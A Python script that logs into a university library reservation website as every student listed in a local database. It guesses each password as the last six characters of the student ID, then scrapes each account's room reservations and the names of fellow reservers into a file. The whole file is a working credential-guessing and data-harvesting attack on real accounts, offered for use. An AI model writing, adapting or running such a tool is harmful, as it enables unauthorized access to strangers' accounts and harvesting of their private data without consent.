#!/usr/bin/python3
# -*- coding: utf-8 -*-

import re
import requests
from bs4 import BeautifulSoup, element

import socket
_dnscache = {("libsouthic.jnu.edu.cn", 80, 0, 1): [(10, 1, 6, '', ('2001:da8:2002::224', 80, 0, 0)), (2, 1, 6, '', ('202.116.0.224', 80))]}
def _setDNSCache():
    def _getaddrinfo(*args, **kwargs):
        global _dnscache
        if args in _dnscache:
            return _dnscache[args]
        else:
            _dnscache[args] = socket._getaddrinfo(*args, **kwargs)
            return _dnscache[args]
    if not hasattr(socket, "_getaddrinfo"):
        socket._getaddrinfo = socket.getaddrinfo
        socket.getaddrinfo = _getaddrinfo


host = "http://libsouthic.jnu.edu.cn"

def getlist():
    import psycopg2
    conn = psycopg2.connect(database="university", user="", password="", host="127.0.0.1", port="5432")
    cur = conn.cursor()
    sql = """SELECT id FROM stunum_view"""
    cur.execute(sql)
    return cur.fetchall()

def login(session, userid, password):
    session.headers["Referer"] = host + "/login"
    data = {
        "t:formdata": "YO0mInLsxupSFzTGH68d4QXjK7k=:H4sIAAAAAAAAAJWQPUoEQRCFywFlYWURwcBc014DN9HERRCEQYTBWHp6yrGlp7vtqnHWxMhLmHgCMdITbGDmHTyAiYGRgfODsLAimBUfj3of7+EdFqsBLMcu13anJAw6owAjF3IhvVTnKFh6JA7XI6FcQKNTkUpCMU5rKBUfaDTZRoJc+s2Taf9t7eUrgoUY+spZDs4cyQIZVuMLeSWHRtp8mHDQNt+deIalrvEXg/F/DY6DU0iUlGmhibSz08ds++zz/jUCmPhqBQZdg5dElQsZXcINAEPvB8xHmsTMOtS85tpt70835QrvLFom0crwvNpd8rH+/HS7H0EUQ08ZXacP27pmODRY1KAZrkXNUL2u/HRr5vwGvfD11LwBAAA=",
        "t:submit": '["submit_0","submit_0"]',
        "userid": userid,
        "password": password,
        "submit_0": "%e7%99%bb%e5%bd%95"
    }
    session.post(host+"/login.userlogin", data=data)

def reservepage(session):
    session.headers["Referer"] = host + "/user"
    rsp = session.get(host+"/user/myreservelist")
    bs = BeautifulSoup(rsp.content, "lxml")
    return bs.find("tr", class_="t-first")

def findmember(session, tr):
    link = tr.a["href"]
    session.headers["Referer"] = host + "/user/myreservelist"
    rsp = session.get(host + link)
    bs = BeautifulSoup(rsp.content, "lxml")
    lst = bs.find(id="reservejonezone")
    if lst is None:
        return "nobody"
    members = lst.find_all("td", class_="username")
    memberstring = ""
    for member in members:
        memberstring += (member.string + " ")
    return "itself" if memberstring=="" else memberstring

def main():
    _setDNSCache()
    w = open("reserve", "w")
    for stuid in getlist():
        uid = stuid[0]
        pw = uid[-6:]
        se = requests.Session()
        login(se, uid, pw)
        first = reservepage(se)
        if first:
            memberstring = findmember(se, first)
            w.write(uid + " reserve room with " + memberstring + "\n")
            print(uid + " reserve room with " + memberstring)
        else:
            print(uid + " does not reserve room")
        del se
    w.close()

if __name__ == "__main__":
    main()
